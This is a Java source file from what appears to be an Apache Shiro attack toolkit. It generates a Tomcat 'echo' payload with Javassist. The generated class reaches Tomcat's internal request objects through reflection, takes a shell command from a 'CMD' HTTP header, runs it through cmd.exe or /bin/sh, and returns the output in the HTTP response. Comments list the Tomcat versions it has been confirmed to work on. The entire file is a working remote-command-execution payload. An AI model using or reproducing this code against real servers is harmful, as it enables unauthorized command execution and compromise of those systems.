package org.shiroattack;

import javassist.*;

// Tomcat回显马，一次执行一次使用
// Tomcat 7.0.0、7.0.10、7.0.109、8.5.54、9.0.10均能够成功利用，6.0.53版本利用失败。
public class TomcatEcho {
    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass clazz = pool.makeClass("org.apache.catalina.x.ACS" + System.nanoTime());

        clazz.addMethod(CtMethod.make("    private static void writeBody(Object obj, byte[] bytes) throws Exception {\n" +
                "        byte[] bs = (new java.lang.String(bytes)).getBytes();\n" +
                "        Object object;\n" +
                "        Class cls;\n" +
                "        try {\n" +
                "            cls = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
                "            object = cls.newInstance();\n" +
                "            cls.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(object, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
                "            obj.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(obj, new Object[]{object});\n" +
                "        } catch (Exception e) {\n" +
                "            cls = Class.forName(\"java.nio.ByteBuffer\");\n" +
                "            object = cls.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(cls, new Object[]{bs});\n" +
                "            obj.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(obj, new Object[]{object});\n" +
                "        }\n" +
                "    }",clazz));

        clazz.addMethod(CtMethod.make("    private static Object getFieldValue(Object obj, String field) throws Exception {\n" +
                "        java.lang.reflect.Field f = null;\n" +
                "        Class cls = obj.getClass();\n" +
                "\n" +
                "        while (cls != Object.class) {\n" +
                "            try {\n" +
                "                f = cls.getDeclaredField(field);\n" +
                "                break;\n" +
                "            } catch (NoSuchFieldException e) {\n" +
                "                cls = cls.getSuperclass();\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        if (f == null) {\n" +
                "            throw new NoSuchFieldException(field);\n" +
                "        } else {\n" +
                "            f.setAccessible(true);\n" +
                "            return f.get(obj);\n" +
                "        }\n" +
                "    }\n", clazz));

        clazz.addConstructor(CtNewConstructor.make("public TomcatEcho() throws Exception {\n" +
                "    boolean flag = false;\n" +
                "    Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
                "\n" +
                "    for (int i = 0; i < threads.length; ++i) {\n" +
                "        Thread thread = threads[i];\n" +
                "        if (thread != null) {\n" +
                "            String threadName = thread.getName();\n" +
                "            if (!threadName.contains(\"exec\") && threadName.contains(\"http\")) {\n" +
                "                Object obj = getFieldValue(thread, \"target\");\n" +
                "                if (obj instanceof Runnable) {\n" +
                "                    try {\n" +
                "                        obj = getFieldValue(getFieldValue(getFieldValue(obj, \"this$0\"), \"handler\"), \"global\");\n" +
                "                    } catch (Exception e) {\n" +
                "                        continue;\n" +
                "                    }\n" +
                "\n" +
                "                    java.util.List processors = (java.util.List) getFieldValue(obj,\"processors\");\n" +
                "\n" +
                "                    for (int n = 0; n < processors.size(); ++n) {\n" +
                "                        Object processor = processors.get(n);\n" +
                "                        obj = getFieldValue(processor, \"req\");\n" +
                "                        Object resp = obj.getClass().getMethod(\"getResponse\", new Class[0]).invoke(obj, new Object[0]);\n" +
                "                        String host = (String) obj.getClass().getMethod" +
                "(\"getHeader\", new Class[]{String.class}).invoke(obj, new Object[]{new String(\"Host\")});\n" +
                "                        if (host != null && !host.isEmpty()) {\n" +
                "                            resp.getClass().getMethod(\"setStatus\", new Class[]{Integer.TYPE}).invoke(resp, new Object[]{new Integer(200)});\n" +
                "                            flag = true;\n" +
                "                        }\n" +
                "\n" +
                "                        String cmd = (String) obj.getClass().getMethod" +
                "(\"getHeader\", new Class[]{String.class}).invoke(obj, new Object[]{new String(\"CMD\")});\n" +
                "                        if (cmd != null && !cmd.isEmpty()) {\n" +
                "                            String[] cmds = System.getProperty(\"os.name\")" +
                ".toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\n" +
                "                            writeBody(resp, (new java.util.Scanner((new " +
                "ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes());\n" +
                "                            flag = true;\n" +
                "                        }\n" +
                "\n" +
                "                        if (flag) {\n" +
                "                            break;\n" +
                "                        }\n" +
                "                    }\n" +
                "\n" +
                "                    if (flag) {\n" +
                "                        break;\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}",clazz));

        // 兼容低版本JDK
        clazz.getClassFile().setMajorVersion(50);
        return clazz;
    }

}